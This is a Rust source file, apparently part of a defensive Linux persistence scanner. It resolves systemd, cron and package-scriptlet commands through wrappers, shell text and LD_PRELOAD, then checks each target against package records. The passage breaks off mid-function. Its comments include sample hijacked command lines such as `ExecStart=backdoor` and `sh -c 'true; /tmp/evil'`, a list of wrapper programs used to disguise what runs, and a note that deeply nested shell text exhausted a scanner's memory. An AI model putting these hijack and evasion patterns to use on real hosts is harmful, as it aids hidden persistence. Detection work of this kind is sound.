//! The second phase. Collectors are independent by design and know nothing
//! of each other, so every fact that needs more than one of them lives here:
//! package provenance, whether a target exists, which unit shadows which, and
//! the LD_PRELOAD assignments that turn up in six different kinds of file.
//!
//! This is also where a rule engine would eventually go. The Entry record
//! carries the raw facts precisely so that it could.

use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};

use crate::dbus;
use crate::entry::{Enablement, Entry, Flag, Integrity, Kind, Provenance};
use crate::provenance;
use crate::root::{Root, is_hidden_path};
use crate::scan::Scan;

pub fn enrich(root: &Root, scan: &mut Scan) {
    let mut failed = Vec::new();

    let commands = stage(&mut failed, "targets", || {
        normalise_targets(root, &mut scan.entries);
        // Before anything reads target_path: a bare `ExecStart=backdoor`
        // names a file just as surely as an absolute path does, and it needs
        // the same provenance lookup and the same interpreter chain.
        resolve_bare_targets(root, &mut scan.entries);
        look_through_wrappers(root, &mut scan.entries)
    });
    scan.entries.extend(commands.unwrap_or_default());

    // Before the paths are gathered, so the interpreters and sourced files
    // these name get their provenance resolved in the same pass as everything
    // else rather than needing a second one.
    if let Some(chained) = stage(&mut failed, "interpreter chain", || interpreter_chain(root, &scan.entries)) {
        scan.entries.extend(chained);
    }

    // Before the paths are gathered too: a preloaded library or a file an
    // interpreter variable names is judged like any other target, in this
    // pass, not one of its own afterwards.
    if let Some(preloads) = stage(&mut failed, "preloads", || preload_entries(root, &scan.entries)) {
        scan.entries.extend(preloads);
    }
    if let Some(hooks) = stage(&mut failed, "interpreter variables", || interpreter_entries(root, &scan.entries)) {
        scan.entries.extend(hooks);
    }

    let wanted = paths_to_resolve(root, &scan.entries);
    let resolution = stage(&mut failed, "provenance", || provenance::resolve(root, &wanted));
    let answers = match resolution {
        Some(r) => {
            failed.extend(r.failures.into_iter().map(|f| format!("provenance: {f}")));
            r.answers
        }
        None => provenance::Answers::new(),
    };

    // The target first: whether it is there, and whether its absence is
    // guarded, is what the provenance pass needs to know before it takes a
    // verdict for it.
    per_entry(&mut failed, "provenance and targets", &mut scan.entries, |entry| {
        apply_target(root, entry);
        apply_provenance(root, entry, &answers);
        apply_location(root, entry);
    });

    // Authoritative enablement goes on after provenance, so a generated
    // unit can be re-attributed from Unpackaged to its generator. A user
    // manager answering on a socket in that user's own runtime directory is
    // exactly as hostile as a file they wrote.
    let entries = &mut scan.entries;
    let header = &mut scan.header;
    stage(&mut failed, "systemd enablement", || {
        if let Some(manager) = dbus::Manager::query(root) {
            let answered = dbus::apply(&manager, entries);
            if answered > 0 {
                header.enablement = "systemd-dbus".to_string();
            }
        }
    });

    stage(&mut failed, "shadowing", || {
        apply_shadowing(&mut scan.entries);
        cross_reference_suid(&mut scan.entries);
        gate_on_super_server(&mut scan.entries);
        vouch_for_sources(&mut scan.entries);
        vouch_for_templates(root, &mut scan.entries, &answers);
    });

    per_entry(&mut failed, "search paths", &mut scan.entries, |e| writable_search_path(root, e));
    per_entry(&mut failed, "setuid bits", &mut scan.entries, |e| setuid_changed_after_install(root, e));

    // Last, so the synthesised entries — a preload, a chained interpreter —
    // are measured by the same threshold as a collector's own.
    per_entry(&mut failed, "encoding", &mut scan.entries, apply_encoding);

    scan.entries.sort_by(|a, b| (a.kind, &a.source, &a.name).cmp(&(b.kind, &b.source, &b.name)));
    // Collectors keep their own ids apart; the entries synthesised above are
    // named after what a file says, which its author chooses. After the sort,
    // so which of two colliding entries keeps the plain id does not depend on
    // the order they were found in.
    crate::entry::dedup_ids(&mut scan.entries);
    scan.header.enrichment_failures.extend(failed);
}

/// One enrichment stage, isolated the way a collector is (§3). A stage that
/// panics on hostile input loses its own facts, says so in the header, and
/// the scan carries on: a scan that aborts on the file the attacker crafted
/// is a scan the attacker controls.
fn stage<T>(failed: &mut Vec<String>, name: &str, f: impl FnOnce() -> T) -> Option<T> {
    match std::panic::catch_unwind(std::panic::AssertUnwindSafe(f)) {
        Ok(v) => Some(v),
        Err(payload) => {
            failed.push(format!("{name}: {}", crate::scan::panic_message(payload)));
            None
        }
    }
}

/// A stage applied entry by entry, so one entry's hostile bytes cost that
/// entry its facts and nothing else. The entry itself is kept and marked.
fn per_entry(failed: &mut Vec<String>, name: &str, entries: &mut [Entry], mut f: impl FnMut(&mut Entry)) {
    for entry in entries {
        if let Err(payload) = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| f(entry))) {
            let why = crate::scan::panic_message(payload);
            entry.note("enrichment_failed", format!("{name}: {why}"));
            failed.push(format!("{name}, entry {}: {why}", entry.short_id()));
        }
    }
}

/// Collectors disagree about whether a target path is the literal string from
/// the file or a path in the scan root's coordinates. Both are made to mean
/// the same thing here, once, so nothing downstream has to know which
/// collector produced an entry.
fn normalise_targets(root: &Root, entries: &mut [Entry]) {
    for e in entries {
        if let Some(target) = e.target_path.take() {
            e.target_path = Some(root.abs(root.rel(&target)));
        }
    }
}

/// A kernel interface is not a file any package could own. Asking the
/// provenance question about `/proc/modules` and answering "unpackaged" is a
/// category error that puts every loaded module — a couple of hundred on an
/// ordinary host — into the default view as a finding.
fn is_kernel_interface(rel: &Path) -> bool {
    rel.starts_with("proc") || rel.starts_with("sys")
}

/// Commands that are a bare name rather than a path, resolved against the
/// search path the mechanism would use.
fn resolve_bare_targets(root: &Root, entries: &mut [Entry]) {
    for entry in entries {
        // A collector that already knows there is no program to find says
        // so. The first word of a lua scriptlet is lua, not a command name.
        if entry.target_path.is_some() || entry.raw.contains_key("target_unverifiable") {
            continue;
        }
        let Some(command) = &entry.command else { continue };
        if let Some(found) = resolve_bare_command(root, entry.kind, command) {
            entry.note("target_resolved_from", "search path");
            entry.target_path = Some(found);
        }
    }
}

/// Programs that run a program named in their own arguments: the options of
/// each that take a value, and how many operands come before the command.
/// Taken at face value, `ExecStart=env evil` runs coreutils, and coreutils
/// is packaged and intact.
const WRAPPERS: &[(&str, &[&str], usize)] = &[
    ("env", &["-u", "-C", "--unset", "--chdir"], 0),
    ("nice", &["-n", "--adjustment"], 0),
    ("nohup", &[], 0),
    ("setsid", &[], 0),
    ("stdbuf", &["-i", "-o", "-e"], 0),
    ("ionice", &["-c", "-n", "-p", "-P", "-u", "--class", "--classdata"], 0),
    ("sudo", &["-u", "-g", "-C", "-D", "-h", "-p", "-r", "-t", "-U", "-T", "--user", "--group"], 0),
    ("command", &[], 0),
    // TCP wrappers: inetd runs tcpd, which checks hosts.allow and then execs
    // the daemon named as its argv[0].
    ("tcpd", &[], 0),
    ("time", &["-f", "-o", "--format", "--output"], 0),
    ("xargs", &["-a", "-d", "-E", "-I", "-L", "-n", "-P", "-s", "--arg-file", "--delimiter", "--max-args", "--max-procs"], 0),
    // A priority, a duration, a lock file.
    ("chrt", &[], 1),
    ("timeout", &["-s", "-k", "--signal", "--kill-after"], 1),
    ("flock", &["-w", "-E", "--timeout", "--conflict-exit-code"], 1),
    // A script path, or with -c the command text itself.
    ("sh", &["-o", "-O"], 0),
    ("bash", &["-o", "-O"], 0),
    ("dash", &["-o"], 0),
    ("zsh", &["-o"], 0),
    // Inside `sh -c` text, the shell hands itself over to what follows.
    ("exec", &["-a"], 0),
    // Another user's shell, run for `-c` text; runuser also takes `-u user
    // command`. Their arguments are read by `unwrap_switch_user`.
    ("su", &[], 0),
    ("runuser", &[], 0),
    // The applet is the first argument: `busybox sh -c ...`, `busybox nohup x`.
    ("busybox", &[], 0),
];

/// Shell builtins and keywords that name no program. Their words are skipped
/// rather than looked up: `true` in `true; /tmp/evil` must not stand in for
/// the command after it.
const NO_PROGRAM: &[&str] = &[
    "cd", "export", "exit", "set", "unset", "local", "shift", "return", "read", "wait", "ulimit",
    "umask", "true", "false", ":", "echo", "printf", "test", "[", "[[", "readonly", "declare", "alias",
    "break", "continue", "fi", "done", "esac", "}", "then", "else", "builtin",
];

/// How deep shell text may nest before the programs inside it are given up as
/// unknown: `$(...)`, backquotes, `eval`, `sh -c` text and wrappers all count
/// against one budget. The text comes from files any user can write, and
/// without a bound 50,000 nested `$(` in a user unit drove a root scan to
/// 4.9 GB and the OOM killer. Real commands nest two or three deep.
const MAX_NESTING: usize = 16;

/// How many entries one command line may add. The text is the author's, and
/// 20,000 programs in one user unit would otherwise be 20,000 rows, all in the
/// default view. Past this the carrier says how many it holds and how many
/// were listed. The carrier stays in view on the evidence it has: text any
/// user can write is unpackaged, and a packaged file edited to say this much
/// reads as modified.
const MAX_COMMANDS_LISTED: usize = 32;

/// Keywords that precede the command they govern.
const LEADING_KEYWORDS: &[&str] = &["if", "elif", "while", "until", "do", "!", "{", "then", "else"];

/// One program a command line starts, the wrappers it was reached through,
/// and the simple command it came from. `program` is None where the command
/// word cannot be known without running the shell: `$CMD`, `$(...)`.
struct Run {
    by: Vec<&'static str>,
    program: Option<String>,
    words: Vec<String>,
}

/// An entry made out of another. It keeps what the carrier's mechanism gives
/// it (collector, source, trigger, principal, enablement, owner, mode and
/// time), so the location and ownership rules judge the file the fact hangs
/// off, and names the carrier. `declared` also keys its id on the carrier: two
/// cron lines can each start /tmp/evil, on different schedules, and those are
/// two findings.
fn made_from(root: &Root, carrier: &Entry, kind: Kind, name: &str, declared: bool) -> Entry {
    let mut e = Entry::new(kind, &carrier.source, name);
    e.collector = carrier.collector.clone();
    let source = root.rel(&carrier.source);
    if declared {
        e.rekey_declared(&source, &carrier.id);
    } else {
        e.rekey(&source);
    }
    e.trigger = carrier.trigger;
    e.principal = carrier.principal.clone();
    e.enabled = carrier.enabled;
    e.owner_uid = carrier.owner_uid;
    e.mode = carrier.mode;
    e.mtime = carrier.mtime;
    e.note("declared_by_entry", &carrier.id);
    e
}

/// Replaces a wrapper as an entry's target with what the wrapper runs, and
/// returns one entry per further program where the command line starts more
/// than one. Shell text is not a single program: `sh -c 'true; /tmp/evil'`
/// starts two, and taking the first would let coreutils vouch for the second.
fn look_through_wrappers(root: &Root, entries: &mut [Entry]) -> Vec<Entry> {
    let mut out = Vec::new();
    // Per declaring entry: two cron lines that each start /tmp/evil are two
    // findings with two triggers, not one.
    let mut seen: BTreeSet<(String, String)> = BTreeSet::new();
    for entry in entries.iter_mut() {
        // A body that is shell text run by an interpreter (a package
        // scriptlet) is a script, not a command line: its target is the
        // interpreter, and each program the text starts is an entry of its own.
        let script = entry.raw.contains_key("script_shell");
        if entry.raw.contains_key("target_unverifiable") && !script {
            continue;
        }
        let Some(command) = entry.command.clone() else { continue };
        let command = command.as_slice();
        let lines = commands(&String::from_utf8_lossy(command), 0);
        let Some(first) = lines.first().and_then(|c| c.first()) else { continue };
        // systemd's ExecStart= prefixes. Not in a script, where `:` is the
        // no-op builtin and `!` negates a pipeline.
        let prefixes: &[char] = if script { &[] } else { &['-', '@', '+', '!', ':'] };
        let head = first.trim_start_matches(prefixes).to_string();
        // Only where argv[0] is what the collector took as the target: a PAM
        // module or a udev key has a target that is not the command word.
        let head_name = Path::new(&head).file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
        if !script && entry.target_path.as_ref().is_some_and(|t| t.file_name().and_then(|n| n.to_str()) != Some(head_name.as_str())) {
            continue;
        }
        let mut runs = Vec::new();
        for mut words in lines {
            if let Some(w) = words.first_mut() {
                *w = w.trim_start_matches(prefixes).to_string();
            }
            programs(words, Vec::new(), 0, &mut runs);
        }
        // The one case with nothing to change: a single program, reached
        // directly, which is what the collector already has.
        if let [run] = runs.as_slice() {
            if !script && entry.target_path.is_some() && run.by.is_empty() && run.program.as_deref() == Some(head.as_str()) {
                continue;
            }
        }
        match runs.as_slice() {
            // Only builtins: the shell itself is what runs.
            [] => {}
            // One program: it is the target, unless the entry is a script,
            // whose target is its interpreter whatever it starts.
            [run] if !script => {
                if !run.by.is_empty() {
                    entry.note("target_wrapped_by", run.by.join(" "));
                }
                entry.target_path = run.program.as_deref().and_then(|p| program_path(root, entry.kind, p));
                if let Some(how) = run.program.as_deref().and_then(|p| guarded_by_test(command, p.as_bytes())) {
                    entry.note("guarded_by_test", how);
                }
            }
            _ => {
                entry.note("runs_commands", runs.len().to_string());
                let mut listed = 0;
                for run in &runs {
                    if listed == MAX_COMMANDS_LISTED {
                        entry.note("commands_listed", format!("the first {listed} of {}", runs.len()));
                        break;
                    }
                    let name = run.program.clone().unwrap_or_else(|| run.words.first().cloned().unwrap_or_default());
                    if !seen.insert((entry.id.clone(), name.clone())) {
                        continue;
                    }
                    // Kind and source are the carrier's, as in the interpreter
                    // chain: cron or systemd is still what makes this run.
                    let mut e = made_from(root, entry, entry.kind, &name, true);
                    e.target_path = run.program.as_deref().and_then(|p| program_path(root, entry.kind, p));
                    e.command = Some(run.words.join(" ").into_bytes());
                    if !run.by.is_empty() {
                        e.note("target_wrapped_by", run.by.join(" "));
                    }
                    e.note("chain", if script { "script" } else { "command line" });
                    if let Some(how) = run.program.as_deref().and_then(|p| guarded_by_test(command, p.as_bytes())) {
                        e.note("guarded_by_test", how);
                    }
                    out.push(e);
                    listed += 1;
                }
            }
        }
    }
    out
}

/// A command word as a file inside the scan root, by path or by search path.
fn program_path(root: &Root, kind: Kind, program: &str) -> Option<PathBuf> {
    if program.starts_with('/') {
        Some(root.abs(root.rel(Path::new(program))))
    } else if program.contains('/') {
        None
    } else {
        resolve_bare_command(root, kind, program.as_bytes())
    }
}

/// The programs one simple command starts, following wrappers and shell text.
/// Past `MAX_NESTING` the program is unknown, and says so by having none.
fn programs(mut words: Vec<String>, by: Vec<&'static str>, depth: usize, out: &mut Vec<Run>) {
    if depth > MAX_NESTING {
        out.push(Run { by, program: None, words: words.into_iter().take(1).collect() });
        return;
    }
    let assignment = |w: &str| w.split_once('=').is_some_and(|(n, _)| !n.is_empty() && n.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'));
    while words.first().is_some_and(|w| LEADING_KEYWORDS.contains(&w.as_str()) || assignment(w)) {
        words.remove(0);
    }
    let Some(word) = words.first().cloned() else { return };
    let name = Path::new(&word).file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    if NO_PROGRAM.contains(&word.as_str()) {
        return;
    }
    match word.as_str() {
        // The file a shell sources is code it runs.
        "." | "source" => {
            if let Some(script) = words.get(1) {
                out.push(Run { by, program: Some(script.clone()), words });
            }
            return;
        }
        "eval" => {
            for c in commands(&words[1..].join(" "), depth + 1) {
                programs(c, by.clone(), depth + 1, out);
            }
            return;
        }
        // `trap action signal...`: the action is shell text the shell runs
        // when the signal arrives, or at exit. `-` restores the default and
        // an empty action ignores the signal; `-p` and `-l` only print, and
        // one argument alone names a signal to reset.
        "trap" => {
            let args: Vec<&String> = words[1..].iter().skip_while(|a| matches!(a.as_str(), "-p" | "-l" | "--")).collect();
            if args.len() >= 2 && !matches!(args[0].as_str(), "-" | "") {
                let mut by_trap = by.clone();
                by_trap.push("trap");
                for c in commands(args[0], depth + 1) {
                    programs(c, by_trap.clone(), depth + 1, out);
                }
            }
            return;
        }
        _ => {}
    }
    let Some(w) = wrapper(&name) else {
        let program = (!word.contains(['$', '`'])).then_some(word);
        out.push(Run { by, program, words });
        return;
    };
    let mut by_next = by.clone();
    by_next.push(w.0);
    match unwrap(w, &words[1..], depth + 1) {
        Unwrapped::Argv(next) => programs(next, by_next, depth + 1, out),
        Unwrapped::Text(text) => {
            let before = out.len();
            for c in commands(&text, depth + 1) {
                programs(c, by_next.clone(), depth + 1, out);
            }
            // Text of nothing but builtins runs only the shell.
            if out.len() == before {
                out.push(Run { by, program: Some(word), words });
            }
        }
        // A shell given no script and no -c text is itself what runs: the
        // emergency and debug shells are exactly that.
        Unwrapped::Nothing if SHELLS.contains(&w.0) || SWITCH_USER.contains(&w.0) => out.push(Run { by, program: Some(word), words }),
        Unwrapped::Nothing => out.push(Run { by: by_next, program: None, words }),
    }
}

const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh"];

/// Programs that run the target user's shell: with `-c` text it is a shell
/// command, and with none it is an interactive shell and `su` is what runs.
const SWITCH_USER: &[&str] = &["su", "runuser"];

fn wrapper(name: &str) -> Option<&'static (&'static str, &'static [&'static str], usize)> {
    WRAPPERS.iter().find(|w| w.0 == name)
}

enum Unwrapped {
    Argv(Vec<String>),
    Text(String),
    Nothing,
}

/// `su [options] [-] [user]` and `runuser [options] user` run the user's
/// shell, on `-c` text if given. `runuser -u user [--] command args` execs the
/// command directly. Options that take a value are skipped with it.
fn unwrap_switch_user(name: &str, args: &[String]) -> Unwrapped {
    const VALUED: &[&str] = &["-s", "--shell", "-g", "--group", "-G", "--supp-group", "-w", "--whitelist-environment", "-P"];
    let mut i = 0;
    let mut user_seen = false;
    while i < args.len() {
        let a = args[i].as_str();
        match a {
            "--" => {
                i += 1;
                // runuser -u user -- command
                return if user_seen && name == "runuser" { rest_as_argv(&args[i..]) } else { Unwrapped::Nothing };
            }
            "-c" | "--command" => return args.get(i + 1).map_or(Unwrapped::Nothing, |t| Unwrapped::Text(t.clone())),
            "-u" | "--user" if name == "runuser" => {
                i += 2;
                // Everything after the user is the command, `--` or not.
                if args.get(i).map(String::as_str) == Some("--") {
                    i += 1;
                }
                return rest_as_argv(args.get(i..).unwrap_or_default());
            }
            _ if VALUED.contains(&a) => i += 2,
            _ if a.starts_with("--command=") => return Unwrapped::Text(a["--command=".len()..].to_string()),
            // A cluster holding -c: -lc, -c with its text next.
            _ if a.starts_with('-') && !a.starts_with("--") && a.len() > 1 && a.contains('c') => {
                return args.get(i + 1).map_or(Unwrapped::Nothing, |t| Unwrapped::Text(t.clone()));
            }
            _ if a.starts_with('-') => i += 1,
            // The user; what follows it is the shell's own arguments.
            _ => {
                user_seen = true;
                i += 1;
            }
        }
    }
    Unwrapped::Nothing
}

fn rest_as_argv(rest: &[String]) -> Unwrapped {
    if rest.is_empty() { Unwrapped::Nothing } else { Unwrapped::Argv(rest.to_vec()) }
}

/// What a wrapper hands on: an argv, shell text, or nothing at all.
fn unwrap(w: &(&str, &[&str], usize), args: &[String], depth: usize) -> Unwrapped {
    if SWITCH_USER.contains(&w.0) {
        return unwrap_switch_user(w.0, args);
    }
    let (name, valued, mut operands) = *w;
    let takes_text = SHELLS.contains(&name) || name == "flock";
    let mut i = 0;
    while i < args.len() {
        let a = args[i].as_str();
        if a == "--" {
            i += 1;
            break;
        }
        if valued.contains(&a) {
            i += 2;
            continue;
        }
        // -c, or a cluster holding it (-lc, -ec, -xc): the next word is the
        // command, as shell text.
        if takes_text && a.starts_with('-') && !a.starts_with("--") && a.contains('c') {
            return args.get(i + 1).map_or(Unwrapped::Nothing, |t| Unwrapped::Text(t.clone()));
        }
        // env -S splits its argument into words and runs them.
        if name == "env" {
            let split = match a {
                "-S" | "--split-string" => args.get(i + 1).map(|t| (t.clone(), i + 2)),
                _ => a
                    .strip_prefix("--split-string=")
                    .or_else(|| a.strip_prefix("-S").filter(|t| !t.is_empty()))
                    .map(|t| (t.to_string(), i + 1)),
            };
            if let Some((text, next)) = split {
                let mut argv = commands(&text, depth).into_iter().next().unwrap_or_default();
                argv.extend(args[next.min(args.len())..].iter().cloned());
                return Unwrapped::Argv(argv);
            }
        }
        if a.starts_with('-') && a.len() > 1 {
            i += 1;
            continue;
        }
        if matches!(name, "env" | "sudo") && a.contains('=') {
            i += 1;
            continue;
        }
        if operands > 0 {
            operands -= 1;
            i += 1;
            continue;
        }
        break;
    }
    match args.get(i..) {
        Some(rest) if !rest.is_empty() => Unwrapped::Argv(rest.to_vec()),
        _ => Unwrapped::Nothing,
    }
}

/// Shell text split into simple commands, each a list of words, by the bash
/// grammar. Redirections and their files are dropped; assignments are kept as
/// `NAME=value` words for `programs` to skip; the insides of `$(...)` and
/// backquotes are commands of their own. Loop and case headers, tests and
/// declarations are not commands and yield none.
///
/// The walk is iterative: a tree built from hostile text is as deep as its
/// nesting, and a recursive walk would overflow on it. Substitutions count
/// against `MAX_NESTING`; past it, and wherever the text does not parse, a
/// command whose program cannot be known stands in, so the entry reads as
/// unresolvable rather than as whatever parsed.
fn commands(text: &str, depth: usize) -> Vec<Vec<String>> {
    let unknown = || vec!["$(".to_string()];
    let mut parser = tree_sitter::Parser::new();
    if parser.set_language(&tree_sitter_bash::LANGUAGE.into()).is_err() {
        return vec![unknown()];
    }
    let Some(tree) = parser.parse(text, None) else { return vec![unknown()] };
    let src = text.as_bytes();
    let mut out = Vec::new();
    if tree.root_node().has_error() {
        out.push(unknown());
    }
    let mut cursor = tree.walk();
    let mut stack = vec![(tree.root_node(), depth)];
    while let Some((node, depth)) = stack.pop() {
        let mut depth = depth;
        match node.kind() {
            "command" => out.push(command_words(node, src)),
            "command_substitution" | "process_substitution" => {
                if depth >= MAX_NESTING {
                    out.push(unknown());
                    continue;
                }
                depth += 1;
            }
            _ => {}
        }
        let children: Vec<_> = node.children(&mut cursor).collect();
        stack.extend(children.into_iter().rev().map(|c| (c, depth)));
    }
    out
}

/// The words of one simple command, quotes removed.
fn command_words(node: tree_sitter::Node, src: &[u8]) -> Vec<String> {
    let mut cursor = node.walk();
    node.named_children(&mut cursor)
        .filter(|c| !c.kind().ends_with("_redirect"))
        .map(|c| match c.kind() {
            "command_name" => c.named_child(0).map_or_else(|| text_of(c, src), |w| unquoted(w, src)),
            _ => unquoted(c, src),
        })
        .collect()
}

/// A word as the shell hands it to a program: quotes removed and escapes
/// resolved. Expansions stay as written, since only running the shell could
/// resolve them.
fn unquoted(node: tree_sitter::Node, src: &[u8]) -> String {
    let text = text_of(node, src);
    match node.kind() {
        // A substitution is a command of its own, found by the walk in
        // `commands`. Left as text here, it would be found a second time
        // when an `eval` or `sh -c` word is parsed again. `$(:)` still reads
        // as an unknowable word, and parses again to a builtin that runs
        // nothing; the grammar rejects an empty `$()`.
        "command_substitution" | "process_substitution" => "$(:)".to_string(),
        "string" => {
            let mut cursor = node.walk();
            node.children(&mut cursor)
                .filter(|c| c.kind() != "\"")
                .map(|c| match c.kind() {
                    "string_content" => unescaped(&text_of(c, src), |e| matches!(e, '$' | '`' | '"' | '\\' | '\n')),
                    _ => unquoted(c, src),
                })
                .collect()
        }
        "raw_string" => text.strip_prefix('\'').and_then(|t| t.strip_suffix('\'')).unwrap_or(&text).to_string(),
        "ansi_c_string" => text.strip_prefix("$'").and_then(|t| t.strip_suffix('\'')).unwrap_or(&text).to_string(),
        "concatenation" => {
            let mut cursor = node.walk();
            node.children(&mut cursor).map(|c| unquoted(c, src)).collect()
        }
        "word" => unescaped(&text, |_| true),
        _ => text,
    }
}

/// `text` with each backslash before a character `escapes` accepts removed.
fn unescaped(text: &str, escapes: impl Fn(char) -> bool) -> String {
    let mut out = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        match chars.peek() {
            Some(&e) if c == '\\' && escapes(e) => {
                out.push(e);
                chars.next();
            }
            _ => out.push(c),
        }
    }
    out
}

fn text_of(node: tree_sitter::Node, src: &[u8]) -> String {
    String::from_utf8_lossy(&src[node.byte_range()]).into_owned()
}

fn paths_to_resolve(root: &Root, entries: &[Entry]) -> BTreeSet<PathBuf> {
    let mut out = BTreeSet::new();
    for e in entries {
        let source = root.rel(&e.source);
        // A kernel interface is not asked about, but what it names is: a
        // loaded module's .ko, a callout's program. Skipping the whole entry
        // here left every loaded module on every live host unknown, and in
        // the default view.
        if !is_kernel_interface(&source) {
            out.insert(source);
        }
        // A line copied from a packaged template is judged by the template.
        if let Some(t) = e.raw.get("matches_template") {
            out.insert(root.rel(Path::new(t)));
        }
        if let Some(t) = &e.target_path {
            let target = root.rel(t);
            // Where a target is a link, the file it ends at is asked about
            // too. update-alternatives links belong to no package, and the
            // file behind one is what actually runs.
            if let Some(end) = link_end(root, &target) {
                out.insert(end);
            }
            out.insert(target);
        }
    }
    out
}

/// A link is judged by the file it leads to, and the entry says so: what
/// runs is the file, whoever owns the link. That covers a link no package
/// owns (/usr/bin/editor -> /etc/alternatives/editor -> /usr/bin/vim.basic
/// is vim), a packaged link dpkg can vouch for only by its change time
/// (/usr/bin/python3 -> python3.10, which another package ships, and which
/// may have been trojaned behind an untouched link), and the same links
/// pointed at /tmp, which end at an unpackaged file. Two things keep the
/// link's own verdict: a link that was itself changed since its package
/// installed it, which is the finding, and a link to a device — a unit
/// masked to /dev/null — which leads to nothing that runs.
fn through_link(
    root: &Root,
    entry: &mut Entry,
    rel: &Path,
    verdict: Provenance,
    answers: &provenance::Answers,
    note: &str,
) -> Provenance {
    let changed = matches!(
        verdict,
        Provenance::Packaged { integrity: Integrity::Modified | Integrity::ModeModified | Integrity::ConffileModified, .. }
    );
    if changed {
        return verdict;
    }
    let Some(end) = link_end(root, rel) else { return verdict };
    if !root.stat_follow(&end).is_ok_and(|m| m.is_file) {
        return verdict;
    }
    match answers.get(&end) {
        Some(v) => {
            entry.note(note, root.abs(&end).to_string_lossy());
            v.clone()
        }
        None => verdict,
    }
}

/// The file a symlinked target finally resolves to, inside the scan root.
fn link_end(root: &Root, rel: &Path) -> Option<PathBuf> {
    if !root.stat(rel).is_ok_and(|m| m.is_symlink) {
        return None;
    }
    root.resolve(rel).ok().filter(|end| end != rel)
}

fn apply_provenance(root: &Root, entry: &mut Entry, answers: &provenance::Answers) {
    // An entry synthesised out of another one — a preloaded library, a
    // script's interpreter — is a row *about its target*. It keeps the
    // carrier's source so the location rules judge the right file, but the
    // package verdict has to be the target's, or an ordinary /bin/sh reached
    // through an unpackaged crontab would itself read as unpackaged.
    // An entry is about its target rather than its source in two cases: one
    // synthesised out of another entry, and one whose source is a kernel
    // interface no package can own. A loaded module's subject is the .ko it
    // came from, and that file is packaged like any other.
    let about_target = entry.raw.contains_key("declared_by_entry")
        || is_kernel_interface(&root.rel(&entry.source));
    // A guarded absent program has no verdict to take: an entry about one
    // is judged by the file that names it. An unguarded absent one keeps
    // the orphan's verdict — nobody's file — which is the finding.
    let guarded = entry.raw.get("target_provenance").is_some_and(|v| v.starts_with("absent, guarded"));
    let subject = (about_target && !guarded).then(|| entry.target_path.clone().map(|t| root.rel(&t))).flatten();

    // Said on the entry, so that nothing downstream has to work out from what
    // else it carries whether its verdict is about its source or another file.
    if let Some(s) = &subject {
        entry.note("provenance_of", root.abs(s).to_string_lossy());
    }
    let source_rel = subject.unwrap_or_else(|| root.rel(&entry.source));
    if is_kernel_interface(&source_rel) {
        entry.note("provenance_caveat", "read from a kernel interface, not a file a package can own");
        return;
    }

    // A path this pass was not asked about keeps whatever an earlier pass
    // decided. Writing Unknown over a resolved verdict would make a later,
    // narrower pass undo the work of the first one.
    if let Some(verdict) = answers.get(&source_rel).cloned() {
        // Only for an entry whose subject is its target. A link that is the
        // entry's own source — an alias in /etc/systemd/system — is itself
        // the evidence, and taking its target's verdict would hide it.
        let verdict =
            if about_target { through_link(root, entry, &source_rel, verdict, answers, "resolves_to") } else { verdict };
        match &verdict {
            Provenance::Unpackaged => entry.flag(Flag::Unpackaged),
            Provenance::Packaged { integrity: Integrity::Modified | Integrity::ModeModified, .. } => {
                entry.flag(Flag::PackagedModified)
            }
            Provenance::Packaged { integrity: Integrity::ConffileModified, .. } => {
                entry.flag(Flag::ConffileModified)
            }
            _ => {}
        }
        entry.provenance = verdict;
    }

    // The target is a separate file with a separate verdict, and an entry
    // whose backing file is packaged can still point at something that is
    // not — which is the whole shape of a hijacked ExecStart.
    // The script a followed program was read out of: vendor text when it is
    // packaged and intact, and then a program it names and does not find is
    // the vendor's optional hand-off rather than an orphan.
    if let Some(from) = entry.raw.get("chain_from").cloned() {
        let verified = answers.get(&root.rel(Path::new(&from))).is_some_and(Provenance::is_verified);
        entry.note("chain_from_provenance", if verified { "intact" } else { "unverified" });
    }
    if let Some(target) = entry.target_path.clone() {
        let target_rel = root.rel(&target);
        if target_rel != source_rel && !guarded {
            let verdict = answers
                .get(&target_rel)
                .cloned()
                .map(|v| through_link(root, entry, &target_rel, v, answers, "target_resolves_to"));
            match &verdict {
                Some(Provenance::Unpackaged) => {
                    entry.note("target_provenance", "unpackaged");
                    entry.flag(Flag::Unpackaged);
                }
                // A directory has no contents to hold a digest of. Its
                // integrity is not unknown so much as not a question, and
                // saying "unknown" would keep every `#includedir` in view.
                Some(Provenance::Packaged { package, .. })
                    if root.stat_follow(&target_rel).is_ok_and(|m| m.is_dir) =>
                {
                    entry.note("target_provenance", format!("{package} (directory)"));
                }
                Some(Provenance::Packaged { package, integrity, .. }) => {
                    entry.note("target_provenance", format!("{package} ({integrity})"));
                    if matches!(integrity, Integrity::Modified | Integrity::ModeModified) {
                        entry.flag(Flag::PackagedModified);
                    }
                }
                // Recorded rather than dropped: the suppression rule needs to
                // know that the thing this entry runs is not a verified file.
                Some(Provenance::GeneratedBy { by }) => entry.note("target_provenance", format!("generated by {by}")),
                Some(Provenance::Reproduced { by }) => entry.note("target_provenance", format!("reproduced by {by} (intact)")),
                Some(Provenance::Unknown) => entry.note("target_provenance", "unknown"),
                // Every target is asked about, so no answer means the lookup
                // failed. Left unrecorded, the suppression rule would read the
                // silence as a verified target and hide the entry. A later,
                // narrower pass that was not asked keeps the earlier verdict.
                None if !entry.raw.contains_key("target_provenance") => {
                    entry.note("target_provenance", "unanswered");
                }
                None => {}
            }
        }
    }
}

/// Directories a bare command name is looked up in. Same list systemd uses,
/// and close enough to any shell's default PATH for the purpose.
const BIN_DIRS: [&str; 6] =
    ["usr/local/sbin", "usr/local/bin", "usr/sbin", "usr/bin", "sbin", "bin"];

/// A command that is not an absolute path is not automatically unresolvable.
/// systemd has allowed bare executable names for years, and `ExecStart=
/// systemctl ...` appears in a hundred vendor units on an ordinary host.
fn resolve_bare_command(root: &Root, kind: Kind, command: &[u8]) -> Option<PathBuf> {
    // The command word as `look_through_wrappers` reads it, so the two agree
    // on what the collector's target is: in `[ -f x ] || evil` that is evil,
    // since a test is not a command.
    let lines = commands(&String::from_utf8_lossy(command), 0);
    // systemd's argument prefixes.
